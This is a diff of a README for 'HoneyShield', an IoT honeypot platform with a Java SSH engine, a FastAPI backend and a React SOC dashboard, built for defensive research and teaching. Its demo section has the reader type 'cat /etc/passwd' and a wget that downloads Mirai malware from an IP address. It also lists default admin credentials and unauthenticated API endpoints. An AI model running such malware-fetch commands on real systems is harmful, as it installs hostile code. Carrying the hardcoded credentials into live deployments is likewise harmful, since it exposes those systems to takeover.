@@ -1,121 +1,285 @@
-# Honeynet Backend (FastAPI)
+# HoneyShield — IoT Honeypot Security Operations Platform
 
-Production-grade REST API for the IoT Honeynet Research Platform.
+> A full-stack, real-time IoT honeypot platform that captures, analyzes, and visualizes live cyberattacks targeting Internet-of-Things devices.
 
-## Stack
+---
 
-| Concern | Choice |
-|---|---|
-| Web framework | FastAPI 0.111 (ASGI, OpenAPI 3) |
-| ORM | SQLAlchemy 2 async + asyncpg |
-| Migrations | Alembic |
-| Auth | JWT (HS256) + bcrypt |
-| Settings | pydantic-settings v2 |
-| Logging | structlog (JSON in prod, pretty in dev) |
-| Caching / broker | Redis (asyncio client) |
-| Background tasks | Celery 5 (Beat) |
-| Tracing | OpenTelemetry FastAPI instrumentation |
-| Metrics | prometheus-fastapi-instrumentator |
-| Linting / typing | Ruff + mypy |
+## Overview
 
-## Folder layout
+**HoneyShield** is an end-to-end cybersecurity research platform built to simulate vulnerable IoT devices (routers, IP cameras, door locks) and capture real attack traffic from the internet. Every SSH login attempt, brute-force credential spray, shell command, and exploit attempt is logged, relayed to a backend API, and displayed live on a professional SOC (Security Operations Center) dashboard.
+
+| Layer | Technology | Purpose |
+|---|---|---|
+| Java Honeypot Engine | Java 17, Apache MINA SSHD | Simulates real IoT device SSH/HTTP/RTSP services |
+| FastAPI Backend | Python 3.11, FastAPI, PostgreSQL | Receives and stores all attack telemetry |
+| React SOC Dashboard | React 18, TypeScript, Vite | Visualizes live attacks in real time |
+
+---
+
+## System Architecture
 
 ```
-backend/
-├── app/
-│   ├── api/                # routers (v1 aggregator)
-│   │   ├── deps/           # auth/role dependencies
-│   │   └── v1/             # auth, honeypots, events, alerts, ai, health
-│   ├── core/               # config, security, logging, errors, middleware
-│   ├── db/                 # session + models + repositories
-│   ├── integrations/       # redis, mqtt, ids (suricata/zeek), ai
-│   ├── schemas/            # Pydantic DTOs
-│   ├── scripts/            # one-shot scripts (seed_admin, …)
-│   ├── services/           # business logic
-│   ├── workers/            # Celery tasks
-│   └── main.py             # FastAPI factory + middleware wiring
-├── alembic/                # migrations
-├── tests/                  # pytest + httpx
-├── scripts/                # dev / migration / seed helpers
-├── Dockerfile
-├── pyproject.toml
-└── .env.example
+INTERNET / LAN (Real or Simulated Attackers)
+           |
+           | SSH / HTTP / RTSP attacks
+           v
++--------------------------------------------------+
+|        Java Honeypot Engine (Port 2222)          |
+|  - Accepts ALL SSH connections (any password)    |
+|  - Presents a fake BusyBox IoT shell             |
+|  - Records every credential pair and command     |
+|  - ApiRelay -> sends events to FastAPI (HTTP/1.1)|
++--------------------------------------------------+
+           |
+           | POST /api/v1/events/{id}/events
+           v
++--------------------------------------------------+
+|        FastAPI Backend (Port 8000)               |
+|  - Ingests events (no auth required)             |
+|  - Stores events in PostgreSQL                   |
+|  - Serves REST API for dashboard                 |
+|  - Public: GET /api/v1/events/recent             |
++--------------------------------------------------+
+           |
+           | JSON polling every 3 seconds
+           v
++--------------------------------------------------+
+|        React SOC Dashboard (Port 5173)           |
+|  - Real-Time Attack Telemetry Feed               |
+|  - Protocol breakdown charts                     |
+|  - Alert management and threat intelligence      |
++--------------------------------------------------+
 ```
 
-## Quick start (local dev)
+---
+
+## Key Features
+
+### Java Honeypot Engine
+- **Multi-Protocol Deception**: SSH (port 2222), HTTP web admin panel (port 8080), RTSP stub (port 554)
+- **Realistic IoT Personas**: Mimics Hikvision cameras, MikroTik routers, door-lock controllers
+- **Fake BusyBox Shell**: Fully interactive fake shell with canned responses for uname, ifconfig, cat, wget, ls
+- **Credential Harvesting**: Captures every username and password attempt in real time
+- **Live API Relay**: Asynchronously forwards events to FastAPI via HTTP/1.1 without blocking the SSH session
+- **DoS Hardening**: 50 global sessions max (3 per IP), idle timeouts, input sanitization
+
+### FastAPI Backend
+- **Event Ingest API**: Public POST /{honeypot_id}/events endpoint
+- **Live Feed API**: Public GET /events/recent — last 100 events, no auth required
+- **PostgreSQL Storage**: Full metadata — IP, port, protocol, payload, timestamp
+- **JWT Authentication**: Role-based access (admin, analyst)
+- **Auto-Provisioning**: Unknown honeypot IDs auto-registered on first event
+
+### React SOC Dashboard
+- **Real-Time Attack Stream**: Polls backend every 3 seconds
+- **Protocol Filters**: Filter by SSH, HTTP, MQTT, RTSP
+- **Severity Badges**: LOW / MEDIUM / HIGH / CRITICAL
+- **Payload Intelligence**: Credentials, shell commands, exploit CVEs, malware URLs
+- **Dark Mode SOC UI**: Professional glassmorphism design
+
+---
+
+## Project Structure
+
+```
+iot-honeypot/
++-- src/main/java/com/security/honeypot/
+|   +-- HoneypotServer.java       # Main server startup (SSH/HTTP/RTSP)
+|   +-- FakeShellFactory.java     # Fake BusyBox interactive shell
+|   +-- DatabaseManager.java      # SQLite logging + API relay hook
+|   +-- ApiRelay.java             # HTTP/1.1 async event forwarder
+|   +-- HttpHoneypot.java         # Fake IoT web admin panel (port 8080)
+|   +-- RtspStub.java             # Fake RTSP camera stub (port 554)
+|   +-- DeviceProfile.java        # IoT device persona definitions
+|   +-- Sanitizer.java            # Input sanitization and hardening
+|
++-- backend/
+|   +-- app/
+|   |   +-- api/v1/
+|   |   |   +-- events.py         # Ingest + live feed endpoints
+|   |   |   +-- honeypots.py      # Honeypot CRUD
+|   |   |   +-- alerts.py         # Alert management
+|   |   |   +-- auth.py           # JWT login/refresh
+|   |   |   +-- dashboard.py      # Analytics endpoints
+|   |   |   +-- health.py         # Health check
+|   |   +-- db/models/honeypot.py # SQLAlchemy ORM models
+|   |   +-- services/honeypot_service.py  # Business logic
+|   +-- seed_admin.py             # Creates default admin user
+|   +-- seed_mock_data.py         # Seeds background attack data
+|   +-- docker-compose.dev.yml    # PostgreSQL for local dev
+|
++-- frontend/src/honeyshield/
+|   +-- section/LiveAttackFeed.tsx   # Real-time telemetry component
+|   +-- page/LoginPage.tsx           # Admin login page
+|   +-- lib/soc-api.ts               # FastAPI client
+|   +-- lib/backend-context.tsx      # Global state + polling loop
+|
++-- target/iot-honeypot.jar       # Compiled runnable JAR
++-- pom.xml                       # Maven build configuration
+```
+
+---
+
+## Running the Platform
+
+### Prerequisites
+- Java 17+
+- Python 3.11+
+- Node.js 18+
+- Docker Desktop (for PostgreSQL)
+
+### Step 1 — Start Backend
+
+Open PowerShell Window 1:
+
+```powershell
+cd d:\HoneyPot-main\iot-honeypot\backend
+docker compose -f docker-compose.dev.yml up -d
+python -m alembic upgrade head
+python seed_admin.py
+python seed_mock_data.py
+python -m uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
+```
+
+Backend API: http://localhost:8000/docs
+
+### Step 2 — Start Dashboard
+
+Open PowerShell Window 2:
+
+```powershell
+cd d:\HoneyPot-main\iot-honeypot\frontend
+npm install
+npm run dev
+```
+
+Dashboard: http://localhost:5173
+Login: admin / Admin@1234!
+
+### Step 3 — Start Java Honeypot
+
+Open PowerShell Window 3:
+
+```powershell
+cd d:\HoneyPot-main\iot-honeypot
+java -jar target/iot-honeypot.jar
+```
+
+SSH Honeypot listening on: 0.0.0.0:2222
+
+### Step 4 — Simulate an Attack
+
+Open PowerShell Window 4:
+
+```powershell
+ssh -p 2222 root@localhost
+```
+
+At the password prompt, press ENTER (any password is accepted).
+Then run commands in the fake shell:
 
 ```bash
-cp .env.example .env
-pip install -e ".[dev]"
-bash scripts/migrate.sh        # alembic upgrade head
-bash scripts/run-dev.sh        # uvicorn with --reload
+uname -a
+cat /etc/passwd
+ifconfig
+wget http://45.14.2.1/mirai.x86
 ```
 
-Open `http://localhost:8000/docs` for Swagger.
+Each command appears LIVE on the dashboard within 3 seconds!
 
-## Quick start (Docker)
+---
 
-```bash
-docker build -t honeynet-backend .
-docker run --rm -p 8000:8000 --env-file .env honeynet-backend
-```
+## Default Credentials
 
-## Endpoints
+| Service | Username | Password |
+|---|---|---|
+| SOC Dashboard | admin | Admin@1234! |
+| Backend API (/docs) | admin | Admin@1234! |
+| SSH Honeypot | any | any (all accepted) |
 
-| Method | Path | Auth | Notes |
+---
+
+## API Reference
+
+| Method | Endpoint | Auth | Description |
 |---|---|---|---|
-| GET  | `/api/v1/health`            | none | Liveness |
-| GET  | `/api/v1/ready`             | none | Readiness (DB+Redis) |
-| GET  | `/api/v1/version`           | none | Build info |
-| POST | `/api/v1/auth/register`     | none | Returns JWT pair |
-| POST | `/api/v1/auth/login`        | none | Returns JWT pair |
-| POST | `/api/v1/auth/refresh`      | none | New access token |
-| GET  | `/api/v1/auth/me`           | JWT  | Current user |
-| GET  | `/api/v1/honeypots`         | JWT + analyst/admin | List |
-| POST | `/api/v1/honeypots`         | JWT + admin | Create |
-| PATCH | `/api/v1/honeypots/{id}`   | JWT + admin | Update |
-| DELETE | `/api/v1/honeypots/{id}`  | JWT + admin | Delete |
-| POST | `/api/v1/events/{hp}/events`| API key / internal | Ingest |
-| GET  | `/api/v1/events/{hp}/events`| JWT + analyst | List |
-| GET  | `/api/v1/events/recent`     | JWT + analyst | Across all |
-| GET  | `/api/v1/alerts`            | JWT + analyst | Recent alerts |
-| GET  | `/api/v1/ai/events/{id}/insights` | JWT + analyst | AI summaries |
+| POST | /api/v1/auth/login | None | Get JWT token |
+| GET | /api/v1/events/recent | None | Live attack feed (last 100) |
+| POST | /api/v1/events/{id}/events | None | Ingest honeypot event |
+| GET | /api/v1/honeypots | Admin | List all honeypot sensors |
+| GET | /api/v1/alerts | Analyst | List security alerts |
+| GET | /api/v1/analytics/stats | Analyst | Attack statistics |
+| GET | /api/v1/health | None | Backend health check |
 
-## Configuration
+---
 
-All settings are typed in `app/core/config/settings.py` and sourced from env (or `.env`). The single accessor is `get_settings()` (cached). Required vars: `JWT_SECRET`, `SESSION_SECRET`, `POSTGRES_PASSWORD`, `REDIS_URL`, `CELERY_BROKER_URL`, `CELERY_RESULT_BACKEND`, `FLOWER_PASSWORD`.
+## How the Live Telemetry Pipeline Works
 
-## Migrations
-
-```bash
-# autogenerate after a model change
-alembic revision --autogenerate -m "add field x"
-
-# apply
-alembic upgrade head
-
-# roll back one step
-alembic downgrade -1
+```
+1. Attacker types "uname -a" in SSH shell
+2. FakeShellFactory.java captures the command
+3. DatabaseManager.logCommand() is called
+   -> SQLite local DB write (honeypot.db)
+   -> ApiRelay.sendCommandEvent()
+       -> HTTP POST (HTTP/1.1) to FastAPI:
+          POST http://localhost:8000/api/v1/events/{hpId}/events
+          Body: {"event_type":"command","protocol":"ssh",
+                 "src_ip":"X.X.X.X","payload":{"command":"uname -a"}}
+       -> FastAPI stores event in PostgreSQL
+4. React dashboard polls /events/recent every 3 seconds
+5. LiveAttackFeed.tsx renders new row at top of feed
 ```
 
-## Tests
+---
 
-```bash
-pytest                 # unit + integration (sqlite in-memory)
-pytest --cov=app       # with coverage
-ruff check .           # lint
-mypy app               # type check
+## Rebuilding the Java JAR
+
+```powershell
+cd d:\HoneyPot-main\iot-honeypot
+
+# Recompile ApiRelay
+javac --release 17 -cp "target/extracted" -d target/classes `
+  src/main/java/com/security/honeypot/ApiRelay.java
+
+# Update the JAR
+jar uf target/iot-honeypot.jar -C target/classes `
+  com/security/honeypot/ApiRelay.class
+
+# Full Maven rebuild
+.\mvnw clean package -DskipTests
 ```
 
-## Production checklist
+---
 
-- `APP_ENV=production`
-- `JWT_SECRET`, `SESSION_SECRET`, `FLOWER_PASSWORD` from a secrets manager
-- `CORS_ORIGINS` explicit (no `*`)
-- `ALLOWED_HOSTS` explicit
-- Run behind a TLS-terminating reverse proxy (Traefik / nginx)
-- Run worker: `celery -A app.workers.celery_app.celery_app worker -l info`
-- Run scheduler: `celery -A app.workers.celery_app.celery_app beat -l info`
-- Run Flower (optional): `celery -A app.workers.celery_app.celery_app flower --basic_auth="${FLOWER_USER}:${FLOWER_PASSWORD}"`
-- Health check: `GET /api/v1/health` returns `{"status":"ok",...}`
-- Metrics: `GET /api/v1/metrics` (Prometheus exposition)
+## Security Design Principles
+
+1. **Isolation**: The honeypot never executes attacker commands — all responses are pre-canned
+2. **Input Sanitization**: Attacker input is scrubbed of ANSI escapes, null bytes, and path traversal sequences
+3. **Resource Limits**: Max 50 SSH sessions (3 per IP), 30-second idle timeout
+4. **No Reflection**: Java exceptions and class names are never exposed to attackers
+5. **Async Relay**: Event forwarding is non-blocking — a slow backend never crashes the honeypot
+
+---
+
+## Use Cases
+
+- **Academic Research**: Capture and study real-world IoT attack patterns
+- **Threat Intelligence**: Build datasets of attacker IPs, credentials, and malware URLs
+- **Security Demonstrations**: Live showcase of cyberattack detection
+- **Student Training**: Hands-on SOC analyst experience with real attack data
+
+---
+
+## Tech Stack
+
+| Component | Technology |
+|---|---|
+| Honeypot Engine | Java 17, Apache MINA SSHD 2.12, BouncyCastle, SQLite |
+| Backend | Python 3.11, FastAPI, SQLAlchemy, Alembic, PostgreSQL, JWT |
+| Frontend | React 18, TypeScript, Vite, Axios |
+| Infrastructure | Docker, Docker Compose |
+| Build | Maven (Java), pip (Python), npm (Node) |
+
+---
+
+*Built for cybersecurity research and educational demonstration purposes.*
